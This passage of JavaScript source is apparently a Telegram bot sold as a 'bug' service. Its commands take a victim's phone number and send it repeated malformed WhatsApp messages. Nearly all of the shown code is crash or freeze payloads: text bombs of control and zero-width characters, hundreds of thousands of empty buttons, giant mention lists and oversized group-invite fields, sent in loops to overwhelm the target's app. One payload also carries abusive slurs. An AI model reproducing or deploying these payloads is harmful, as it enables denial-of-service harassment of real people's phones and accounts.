  await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
  caption: `
<pre>⿻χ-ɖʀєαɖ⿻

payload
◉ Target: ${number}
◉ Type: ${getCommandType(ctx)}
◉ username: @${ctx.from.username || ctx.from.first_name}
◉ Status : sᴜᴋsᴇs
────────────────────
χ-ɖʀєαɖ</pre>`,
  parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [[
      {
        text: "ᴄᴇᴋ ꜱɪ ᴀᴍᴘᴀꜱ",
        url: `https://wa.me/${number}`, style: "primary"
      },
      {
        text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ",
        url: "https://t.me/Razzxyubot", style: "danger"
      }
    ]]
  }
});

  const speed = 10;
  const initialDelay = 0;

  for (let i = 0; i < 20; i++) {
    await new Promise(res => setTimeout(res, initialDelay));
    await Delay(sock, target);
    await Delay(sock, target);
    await Delay(sock, target);
    await Delay(sock, target);
    await Delay(sock, target);
    await Delay(sock, target);
  }
});

bot.command("Xdelay", checkWhatsAppConnection, checkPremiumOrGroupPremium, checkJoinChannel, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /Xdelay 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // KIRIM TEKS KE TELEGRAM (BUKAN FOTO)
  await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
  caption: `
<pre>⿻χ-ɖʀєαɖ⿻

payload
◉ Target: ${number}
◉ Type: ${getCommandType(ctx)}
◉ username: @${ctx.from.username || ctx.from.first_name}
◉ Status : sᴜᴋsᴇs
────────────────────
χ-ɖʀєαɖ</pre>`,
  parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [[
      {
        text: "ᴄᴇᴋ ꜱɪ ᴀᴍᴘᴀꜱ",
        url: `https://wa.me/${number}`, style: "primary"
      },
      {
        text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ",
        url: "https://t.me/Razzxyubot", style: "danger"
      }
    ]]
  }
});

  const speed = 10;
  const initialDelay = 0;

  for (let i = 0; i < 30; i++) {
    await new Promise(res => setTimeout(res, initialDelay));
    await canxenv(sock, target);
    await canxenv(sock, target);
    await canxenv(sock, target);
    await canxenv(sock, target);
    await canxenv(sock, target);
    await canxenv(sock, target);
  }
});

bot.command("slayerdelay", checkWhatsAppConnection, checkPremiumOrGroupPremium, checkJoinChannel, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /xspam 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  // SEND FOTO 1 KALI DOANG, TANPA EDIT
  await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
  caption: `
<pre>⿻χ-ɖʀєαɖ⿻

payload
◉ Target: ${number}
◉ Type: ${getCommandType(ctx)}
◉ username: @${ctx.from.username || ctx.from.first_name}
◉ Status : sᴜᴋsᴇs
────────────────────
χ-ɖʀєαɖ</pre>`,
  parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [[
      {
        text: "ᴄᴇᴋ ꜱɪ ᴀᴍᴘᴀꜱ",
        url: `https://wa.me/${number}`, style: "primary"
      },
      {
        text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ",
        url: "https://t.me/Razzxyubot", style: "danger"
      }
    ]]
  }
});

  const speed = 10;
  const initialDelay = 0;

  for (let i = 0; i < 30; i++) {
    await new Promise(res => setTimeout(res, initialDelay));
    await DelayHard(sock, target);
    await DelayHard(sock, target);
    await DelayHard(sock, target);
    await DelayHard(sock, target);
    await DelayHard(sock, target);
    await DelayHard(sock, target);
  }
});

bot.command("spamkiller", checkWhatsAppConnection, checkPremiumOrGroupPremium, checkJoinChannel, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /xspam 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  // SEND FOTO 1 KALI DOANG, TANPA EDIT
  await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
  caption: `
<pre>⿻χ-ɖʀєαɖ⿻

payload
◉ Target: ${number}
◉ Type: ${getCommandType(ctx)}
◉ username: @${ctx.from.username || ctx.from.first_name}
◉ Status : sᴜᴋsᴇs
────────────────────
χ-ɖʀєαɖ</pre>`,
  parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [[
      {
        text: "ᴄᴇᴋ ꜱɪ ᴀᴍᴘᴀꜱ",
        url: `https://wa.me/${number}`, style: "primary"
      },
      {
        text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ",
        url: "https://t.me/Razzxyubot", style: "danger"
      }
    ]]
  }
});

  const speed = 10;
  const initialDelay = 0;

  for (let i = 0; i < 30; i++) {
    await new Promise(res => setTimeout(res, initialDelay));
    await delayinvisible(sock, target);
    await delayinvisible(sock, target);
    await delayinvisible(sock, target);
    await delayinvisible(sock, target);
    await delayinvisible(sock, target);
    await delayinvisible(sock, target);
  }
});

bot.command("Xcline", checkWhatsAppConnection, checkPremiumOrGroupPremium, checkJoinChannel, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /Xdelay 62×××`);

  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
  caption: `
<pre>⿻χ-ɖʀєαɖ⿻

payload
◉ Target: ${number}
◉ Type: ${getCommandType(ctx)}
◉ username: @${ctx.from.username || ctx.from.first_name}
◉ Status : sᴜᴋsᴇs
────────────────────
χ-ɖʀєαɖ</pre>`,
  parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [[
      {
        text: "ᴄᴇᴋ ꜱɪ ᴀᴍᴘᴀꜱ",
        url: `https://wa.me/${number}`, style: "primary"
      },
      {
        text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ",
        url: "https://t.me/Razzxyubot", style: "danger"
      }
    ]]
  }
});

  const speed = 10;
  const initialDelay = 0;

  for (let i = 0; i < 30; i++) {
    await new Promise(res => setTimeout(res, initialDelay));
    await DelayHardRmn(sock, target);
    await DelayHardRmn(sock, target);
    await DelayHardRmn(sock, target);
    await DelayHardRmn(sock, target);
    await DelayHardRmn(sock, target);
    await DelayHardRmn(sock, target);
  }
});

bot.command("Xbugs", checkWhatsAppConnection, checkPremiumOrGroupPremium, checkJoinChannel, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /xspam 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  
  let potentialColor = "🟢"

  // SEND FOTO 1 KALI DOANG, TANPA EDIT
  await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
  caption: `
<pre>⿻χ-ɖʀєαɖ⿻

payload
◉ Target: ${number}
◉ Type: ${getCommandType(ctx)}
◉ username: @${ctx.from.username || ctx.from.first_name}
◉ Status : sᴜᴋsᴇs
────────────────────
χ-ɖʀєαɖ</pre>`,
  parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [[
      {
        text: "ᴄᴇᴋ ꜱɪ ᴀᴍᴘᴀꜱ",
        url: `https://wa.me/${number}`, style: "primary"
      },
      {
        text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ",
        url: "https://t.me/Razzxyubot", style: "danger"
      }
    ]]
  }
});

  const speed = 10;
  const initialDelay = 0;

  for (let i = 0; i < 15; i++) {
    await new Promise(res => setTimeout(res, initialDelay));
    await delaycanx(sock, target);
    await delaycanx(sock, target);
    await delaycanx(sock, target);
    await delaycanx(sock, target);
    await delaycanx(sock, target);
    await delaycanx(sock, target);
  }
});

//batas cmd

bot.command('groupban', async (ctx) => {
  // Handler lama memanggil fungsi/variabel yang tidak didefinisikan
  // (getCurrentDate, getRandomImage, sessions, dll.) dan menyebabkan bot crash.
  // Command ini dinonaktifkan agar bot tetap berjalan normal.
  return ctx.reply("⚠️ /groupban sementara dinonaktifkan karena handler lama tidak valid.");
});

//------------- RAZZXY BUG -------------///.

async function Delay(sock, target) {
    const payload = {
        interactiveResponseMessage: {
            body: {
                text: "𝐗𝐀𝐅𝐈𝐄𝐑" + "\u202E".repeat(10000),
                format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
                name: "cta_url",
                paramsJson: JSON.stringify({
                    display_text: "\u200B".repeat(10000) + "ꦾ".repeat(60000),
                    url: "https://files.catbox.moe/sevb1w.mp4",
                    merchant_url: "https://t.me/Diks404"
                }),
                version: 3
            }
        }
    };

    for (let i = 0; i < 25; i++) {
        try { await sock.relayMessage(target, payload, {}); } catch (e) {}
    }
}

async function canxenv(sock, target) {
    // Build text bomb
    var textBomb = '';
    
    // \u1000 - \u109F (21 karakter)
    textBomb += '\u1000'.repeat(21);
    textBomb += '\u1001'.repeat(21);
    textBomb += '\u1002'.repeat(21);
    textBomb += '\u1003'.repeat(21);
    textBomb += '\u1004'.repeat(21);
    textBomb += '\u1005'.repeat(21);
    textBomb += '\u1006'.repeat(21);
    textBomb += '\u1007'.repeat(21);
    textBomb += '\u1008'.repeat(21);
    textBomb += '\u1009'.repeat(21);
    textBomb += '\u100A'.repeat(21);
    textBomb += '\u100B'.repeat(21);
    textBomb += '\u100C'.repeat(21);
    textBomb += '\u100D'.repeat(21);
    textBomb += '\u100E'.repeat(21);
    textBomb += '\u100F'.repeat(21);
    textBomb += '\u1010'.repeat(21);
    textBomb += '\u1011'.repeat(21);
    textBomb += '\u1012'.repeat(21);
    textBomb += '\u1013'.repeat(21);
    textBomb += '\u1014'.repeat(21);
    textBomb += '\u1015'.repeat(21);
    textBomb += '\u1016'.repeat(21);
    textBomb += '\u1017'.repeat(21);
    textBomb += '\u1018'.repeat(21);
    textBomb += '\u1019'.repeat(21);
    textBomb += '\u101A'.repeat(21);
    textBomb += '\u101B'.repeat(21);
    textBomb += '\u101C'.repeat(21);
    textBomb += '\u101D'.repeat(21);
    textBomb += '\u101E'.repeat(21);
    textBomb += '\u101F'.repeat(21);
    textBomb += '\u1020'.repeat(21);
    textBomb += '\u1021'.repeat(21);
    textBomb += '\u1022'.repeat(21);
    textBomb += '\u1023'.repeat(21);
    textBomb += '\u1024'.repeat(21);
    textBomb += '\u1025'.repeat(21);
    textBomb += '\u1026'.repeat(21);
    textBomb += '\u1027'.repeat(21);
    textBomb += '\u1028'.repeat(21);
    textBomb += '\u1029'.repeat(21);
    textBomb += '\u102A'.repeat(21);
    textBomb += '\u102B'.repeat(21);
    textBomb += '\u102C'.repeat(21);
    textBomb += '\u102D'.repeat(21);
    textBomb += '\u102E'.repeat(21);
    textBomb += '\u102F'.repeat(21);
    textBomb += '\u1030'.repeat(21);
    textBomb += '\u1031'.repeat(21);
    textBomb += '\u1032'.repeat(21);
    textBomb += '\u1033'.repeat(21);
    textBomb += '\u1034'.repeat(21);
    textBomb += '\u1035'.repeat(21);
    textBomb += '\u1036'.repeat(21);
    textBomb += '\u1037'.repeat(21);
    textBomb += '\u1038'.repeat(21);
    textBomb += '\u1039'.repeat(21);
    textBomb += '\u103A'.repeat(21);
    textBomb += '\u103B'.repeat(21);
    textBomb += '\u103C'.repeat(21);
    textBomb += '\u103D'.repeat(21);
    textBomb += '\u103E'.repeat(21);
    textBomb += '\u103F'.repeat(21);
    textBomb += '\u1040'.repeat(21);
    textBomb += '\u1041'.repeat(21);
    textBomb += '\u1042'.repeat(21);
    textBomb += '\u1043'.repeat(21);
    textBomb += '\u1044'.repeat(21);
    textBomb += '\u1045'.repeat(21);
    textBomb += '\u1046'.repeat(21);
    textBomb += '\u1047'.repeat(21);
    textBomb += '\u1048'.repeat(21);
    textBomb += '\u1049'.repeat(21);
    textBomb += '\u104A'.repeat(21);
    textBomb += '\u104B'.repeat(21);
    textBomb += '\u104C'.repeat(21);
    textBomb += '\u104D'.repeat(21);
    textBomb += '\u104E'.repeat(21);
    textBomb += '\u104F'.repeat(21);
    textBomb += '\u1050'.repeat(21);
    textBomb += '\u1051'.repeat(21);
    textBomb += '\u1052'.repeat(21);
    textBomb += '\u1053'.repeat(21);
    textBomb += '\u1054'.repeat(21);
    textBomb += '\u1055'.repeat(21);
    textBomb += '\u1056'.repeat(21);
    textBomb += '\u1057'.repeat(21);
    textBomb += '\u1058'.repeat(21);
    textBomb += '\u1059'.repeat(21);
    textBomb += '\u105A'.repeat(21);
    textBomb += '\u105B'.repeat(21);
    textBomb += '\u105C'.repeat(21);
    textBomb += '\u105D'.repeat(21);
    textBomb += '\u105E'.repeat(21);
    textBomb += '\u105F'.repeat(21);
    textBomb += '\u1060'.repeat(21);
    textBomb += '\u1061'.repeat(21);
    textBomb += '\u1062'.repeat(21);
    textBomb += '\u1063'.repeat(21);
    textBomb += '\u1064'.repeat(21);
    textBomb += '\u1065'.repeat(21);
    textBomb += '\u1066'.repeat(21);
    textBomb += '\u1067'.repeat(21);
    textBomb += '\u1068'.repeat(21);
    textBomb += '\u1069'.repeat(21);
    textBomb += '\u106A'.repeat(21);
    textBomb += '\u106B'.repeat(21);
    textBomb += '\u106C'.repeat(21);
    textBomb += '\u106D'.repeat(21);
    textBomb += '\u106E'.repeat(21);
    textBomb += '\u106F'.repeat(21);
    textBomb += '\u1070'.repeat(21);
    textBomb += '\u1071'.repeat(21);
    textBomb += '\u1072'.repeat(21);
    textBomb += '\u1073'.repeat(21);
    textBomb += '\u1074'.repeat(21);
    textBomb += '\u1075'.repeat(21);
    textBomb += '\u1076'.repeat(21);
    textBomb += '\u1077'.repeat(21);
    textBomb += '\u1078'.repeat(21);
    textBomb += '\u1079'.repeat(21);
    textBomb += '\u107A'.repeat(21);
    textBomb += '\u107B'.repeat(21);
    textBomb += '\u107C'.repeat(21);
    textBomb += '\u107D'.repeat(21);
    textBomb += '\u107E'.repeat(21);
    textBomb += '\u107F'.repeat(21);
    textBomb += '\u1080'.repeat(21);
    textBomb += '\u1081'.repeat(21);
    textBomb += '\u1082'.repeat(21);
    textBomb += '\u1083'.repeat(21);
    textBomb += '\u1084'.repeat(21);
    textBomb += '\u1085'.repeat(21);
    textBomb += '\u1086'.repeat(21);
    textBomb += '\u1087'.repeat(21);
    textBomb += '\u1088'.repeat(21);
    textBomb += '\u1089'.repeat(21);
    textBomb += '\u108A'.repeat(21);
    textBomb += '\u108B'.repeat(21);
    textBomb += '\u108C'.repeat(21);
    textBomb += '\u108D'.repeat(21);
    textBomb += '\u108E'.repeat(21);
    textBomb += '\u108F'.repeat(21);
    textBomb += '\u1090'.repeat(21);
    textBomb += '\u1091'.repeat(21);
    textBomb += '\u1092'.repeat(21);
    textBomb += '\u1093'.repeat(21);
    textBomb += '\u1094'.repeat(21);
    textBomb += '\u1095'.repeat(21);
    textBomb += '\u1096'.repeat(21);
    textBomb += '\u1097'.repeat(21);
    textBomb += '\u1098'.repeat(21);
    textBomb += '\u1099'.repeat(21);
    textBomb += '\u109A'.repeat(21);
    textBomb += '\u109B'.repeat(21);
    textBomb += '\u109C'.repeat(21);
    textBomb += '\u109D'.repeat(21);
    textBomb += '\u109E'.repeat(21);
    textBomb += '\u109F'.repeat(21);

    // \u000 - \u00F (null bytes + control)
    textBomb += '\u0000'.repeat(21);
    textBomb += '\u0001'.repeat(21);
    textBomb += '\u0002'.repeat(21);
    textBomb += '\u0003'.repeat(21);
    textBomb += '\u0004'.repeat(21);
    textBomb += '\u0005'.repeat(21);
    textBomb += '\u0006'.repeat(21);
    textBomb += '\u0007'.repeat(21);
    textBomb += '\u0008'.repeat(21);
    textBomb += '\u0009'.repeat(21);
    textBomb += '\u000A'.repeat(21);
    textBomb += '\u000B'.repeat(21);
    textBomb += '\u000C'.repeat(21);
    textBomb += '\u000D'.repeat(21);
    textBomb += '\u000E'.repeat(21);
    textBomb += '\u000F'.repeat(21);

    // \u200 - \u20F
    textBomb += '\u0200'.repeat(21);
    textBomb += '\u0201'.repeat(21);
    textBomb += '\u0202'.repeat(21);
    textBomb += '\u0203'.repeat(21);
    textBomb += '\u0204'.repeat(21);
    textBomb += '\u0205'.repeat(21);
    textBomb += '\u0206'.repeat(21);
    textBomb += '\u0207'.repeat(21);
    textBomb += '\u0208'.repeat(21);
    textBomb += '\u0209'.repeat(21);
    textBomb += '\u020A'.repeat(21);
    textBomb += '\u020B'.repeat(21);
    textBomb += '\u020C'.repeat(21);
    textBomb += '\u020D'.repeat(21);
    textBomb += '\u020E'.repeat(21);
    textBomb += '\u020F'.repeat(21);

    // \u300 - \u30F
    textBomb += '\u0300'.repeat(21);
    textBomb += '\u0301'.repeat(21);
    textBomb += '\u0302'.repeat(21);
    textBomb += '\u0303'.repeat(21);
    textBomb += '\u0304'.repeat(21);
    textBomb += '\u0305'.repeat(21);
    textBomb += '\u0306'.repeat(21);
    textBomb += '\u0307'.repeat(21);
    textBomb += '\u0308'.repeat(21);
    textBomb += '\u0309'.repeat(21);
    textBomb += '\u030A'.repeat(21);
    textBomb += '\u030B'.repeat(21);
    textBomb += '\u030C'.repeat(21);
    textBomb += '\u030D'.repeat(21);
    textBomb += '\u030E'.repeat(21);
    textBomb += '\u030F'.repeat(21);

    // ============ BUILD MESSAGE ============
    const msg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: textBomb
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({})),
                        nativeFlowResponsMessage: {
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        }
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, msg);
}

async function DelayHard(sock, target) {
  try {
    await sock.relayMessage(target, {
      interactiveMessage: {
        body: {
          text: "\u0000".repeat(3000),
          format: "DEFAULT"
        },
        nativeFlowMessage: {
          buttons: "\0".repeat(230000)
        },
        contextInfo: {
          mentionedJid: Array.from({ length: 20 }, () =>
            "1" + Math.floor(Math.random() * 900) + "@s.whatsapp.net"
          )
        }
      }
    }, {});

    await sock.relayMessage(target, {
      interactiveMessage: {
        body: {
          text: " i love reymon!¡💗",
          format: "DEFAULT"
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "boking_mesaage".repeat(2000),
              buttonParamsJson: "{}"
            }
          ]
        }
      }
    }, {});

    console.log("✅ Bug Sukses di kirim");

  } catch (e) {
    console.log("❌ Error:", e.message || e);
  }
}

async function delayinvisible(target) {
  let permissionX = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: 'ꦻ࣯࣯ D𝚵L𐌀Y ¡ИV¡S 𖣘',
              format: 'DEFAULT',
            },
            nativeFlowResponseMessage: {
              name: 'call_permission_request',
              paramsJson: 'x10'.repeat(1045000),
              version: 3,
            },
            entryPointConversionSource: 'call_permission_message',
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        '#' +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, '99999999'),
    },
  );

  let permissionY = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: '𒑡 ЯUXⱿS ᭯CЯ𐌀ⱿY 𖣂',
              format: 'DEFAULT',
            },
            nativeFlowResponseMessage: {
              name: 'galaxy_message',
              paramsJson: 'x10'.repeat(1045000),
              version: 3,
            },
            entryPointConversionSource: 'call_permission_request',
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        '#' +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, '99999999'),
    },
  );

  await sock.relayMessage('status@broadcast', permissionX.message, {
    messageId: permissionX.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: 'meta',
        attrs: {},
        content: [
          {
            tag: 'mentioned_users',
            attrs: {},
            content: [
              {
                tag: 'to',
                attrs: { jid: target },
              },
            ],
          },
        ],
      },
    ],
  });

  await sock.relayMessage('status@broadcast', permissionY.message, {
    messageId: permissionY.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: 'meta',
        attrs: {},
        content: [
          {
            tag: 'mentioned_users',
            attrs: {},
            content: [
              {
                tag: 'to',
                attrs: { jid: target },
              },
            ],
          },
        ],
      },
    ],
  });
}

async function DelayHardRmn(target) {
  await sock.relayMessage(target, {
    groupInviteMessageV2: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "X".repeat(95727),
      inviteExpiration: "99999999999",
      groupName: "៚" + "ោ៝".repeat(95727),
      caption: "ោ៝".repeat(95727),
      contextInfo: {
        expiration: 1,
        ephemeralSettingTimestamp: 1,
        entryPointConversionSource: "WhatsApp.com",
        entryPointConversionApp: "WhatsApp",
        entryPointConversionDelaySeconds: 1,
        disappearingMode: {
          initiatorDeviceJid: target,
          initiator: "INITIATED_BY_OTHER",
          trigger: "UNKNOWN_GROUPS"
        },
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast",
        mentionedJid: "0@s.whatsapp.net",
        questionMessage: {
          paymentInviteMessage: {
            serviceType: 1,
            expiryTimestamp: null
          }
        },
        externalAdReply: {
          showAdAttribution: false,
          sockderLargerThumbnail: true
        }
      },
    },
  }, { participant: { jid: target }, });
  
  await sock.relayMessage(target, {
    viewOnceMessageV2: {
      message: {
        listResponseMessage: {
          title: "៚",
          listType: 4,
          buttonText: { displayText: "🩸" },
          sections: [],
          singleSelectReply: {
            selectedRowId: "⌜⌟"
          },
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            participant: "0@s.whatsapp.net",
            remoteJid: "who know's ?",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 60
              }
            },
            externalAdReply: {
              title: "💧",
              body: "🩸",
              mediaType: 1,
              sockderLargerThumbnail: false,
              nativeFlowButtons: [
                {
                  name: "janda_info",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    },
  }, { participant: { jid: target }, });
  console.log(chalk.red('Berhasil Mengirim Bug'));
}

async function Buldozer(sock, target) {
    for (let i = 0; i < 55; i++) {
        const msg = generateWAMessageFromContent(target, {
            audioMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/invalid",
                mimetype: "audio/mp4",
                fileSha256: Buffer.alloc(32).toString("base64"),
                fileEncSha256: Buffer.alloc(32).toString("base64"),
                mediaKey: Buffer.alloc(32).toString("base64"),
                fileLength: "999999999999999999",
                seconds: 999999,
                ptt: true,
                directPath: "/o1/v/t62.7118-24/f2/m231/" + "\u202E".repeat(7000),
                mediaKeyTimestamp: "9999999999999",
                contextInfo: {
                    mentionedJid: Array.from({ length: 5000 }, function() {
                        return Math.floor(Math.random() * 500000) + "@s.whatsapp.net";
                    }),
                    forwardingScore: 999999,
                    isForwarded: true,
                    conversionSource: "\u202E".repeat(7000) + "\u034F".repeat(8000),
                    quotedMessage: {
                        conversation: "\u034F".repeat(7000) + "\u202E".repeat(8000)
                    }
                }
            }
        }, { userJid: target });

        try {
            await sock.relayMessage(target, msg.message, {
                messageId: msg.key.id + "_" + i
            });
        } catch (e) {}

        await new Promise(r => setTimeout(r, 500));
    }
}

async function Blank(sock, target) {
    const payload = {
        viewOnceMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "𝐗𝐀𝐅𝐈𝐄𝐑 𝐂𝐑𝐀𝐒𝐇"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({})),
                        name: "galaxy_message",
                        buttonParamsJson: JSON.stringify({
                            display_text: "\u200D".repeat(6000),
                            id: "{".repeat(5000)+"ꦾ".repeat(6000),
                            flow_token: "\uFE0F".repeat(6000)+"u600b".repeat(5000),
                        })
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, payload, {});
}

async function FreezeChatApa(sock, target) {
  try {
    await sock.relayMessage(target, {
      interactiveMessage: {
        body: {
          text: "ANAK HARAM ANJING KONTOL" + 
                "\u0000".repeat(20000) + 
                "\u1A01".repeat(50000) + 
                "\u1A00".repeat(50000),
          format: "DEFAULT"
        },
        nativeFlowMessage: {
          buttons: "chat_gpt_ai".repeat(30000)
        },
        contextInfo: {
          mentionedJid: Array.from({ length: 100 }, function(_, i) {
            return String(i + 1) + "@s.whatsapp.net";
          })
        }
      }
    }, {});

    console.log("✅ FreezeChatApa terkirim ke", target);

  } catch (e) {
    console.log("❌ Error FreezeChatApa:", e.message || e);
  }
}

async function XkaClick(sock, target) {
    try {
        const msg = {
            stickerPackMessage: {
                stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
                name: "ReymonNewEra",
                publisher: "\0",
                stickers: [],
                fileLength: 12260,
                fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
                fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
                mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
                directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
                height: 9999,
                width: 9999,
                mediaKeyTimestamp: "1747502082",
                isAnimated: false,
                isAvatar: false,
                isAiSticker: false,
                isLottie: false,
                emojis: ["🐉", "👾", "🩸", "♻️", "☠️"],
                contextInfo: {
                    isForwarded: true,
                    forwardOrigin: 4,
                    participant: target
                },
                packDescription: "",
                trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
                thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
                thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
                thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
                thumbnailHeight: 252,
                thumbnailWidth: 252,
                imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
                stickerPackSize: "3680054",
                stickerPackOrigin: "USER_CREATED"
            }
        };

        await sock.relayMessage(target, msg, {});
        console.log("✅ BUG SUKSES TERKIRIM", target);
    } catch (err) {
        console.error("❌ ERROR:", err.message);
    }
}

async function delaycanx(sock, target) {
    const msg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "canx env anti redup"
                    },
                    nativeFlowMessage: {
                        name: "call_permission_request",
                        buttons: "\n" + "\u200B" + "\x10".repeat(70000)
                    },
                    contextInfo: {
                        participant: target,
                        mentionedJid: Array.from({ length: 2000 }, () =>
                            Math.floor(Math.random() * 700000) + "@s.whatsapp.net"
                        )
                    }
                }
            }
        }
    };

    
    const canx = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "canx enak ahh" + "\n".repeat(7000) 
                    },
                    contextInfo: {
                        forwardingScore: 99999,
                        isForwarded: true,
                        forwardedAiBotMessageInfo: {
                            botJid: "867051314767696@bot",
                            mentionedJid: Array.from({ length: 2000 }, () =>
                                Math.floor(Math.random() * 700000) + "@s.whatsapp.net"
                            )
                        },
                        forwardOrigin: 4
                    },
                    nativeFlowMessage: {
                        name: "carousel_message",
                        buttons: Array.from({ length: 30 }, () => ({}))
                    }
                }
            }
        }
    };

    
    await sock.relayMessage(target, msg, {});
    await sock.relayMessage(target, canx, {});
}

async function m(sock, target) {
    const repeat = 1000000;

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                botForwardedMessage: {
                    message: {
                        richResponseMessage: {
                            messageType: 2,
                            submessages: [
                                {
                                    messageType: 8,
                                    latexMetadata: {
                                        text: "\0",
                                        expressions: [
                                            {
                                                latexExpression: "\0",
                                                width: 999999999
                                            }
                                        ]
                                    }
                                }
                            ],
                            contextInfo: {
                                isForwarded: true,
                                forwardOrigin: 4,
                                participant: target
                            }
                        }
                    }
                }
            }
        }
    });

    await sock.relayMessage(target, {
        protocolMessage: {
            type: 0,
            key: { remoteJid: target, fromMe: true },
            message: {
                interactiveMessage: {
                    body: { text: "\u0000".repeat(90000) },
                    nativeFlowMessage: {
                        buttons: [
                            { name: "quick_reply", buttonParamsJson: "\x00".repeat(25000) },
                            { name: "quick_reply", buttonParamsJson: "\0".repeat(12878) }
                        ],
                        messageParamsJson: JSON.stringify({
                            displayName: "X",
                            title: "\0".repeat(30000)
                        })
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 4000 }, () => ""),
                        forwardingScore: 9999,
                        isForwarded: true,
                        quotedMessage: {
                            locationMessage: {
                                degreesLatitude: -999.999,
                                degreesLongitude: 999.999,
                                name: "\u0000".repeat(35000),
                                address: "Monkey".repeat(40000),
                                contextInfo: {
                                    mentionedJid: Array.from({ length: 2000 }, () => ""),
                                    forwardingScore: 9999,
                                    isForwarded: true
                                }
                            }
                        }
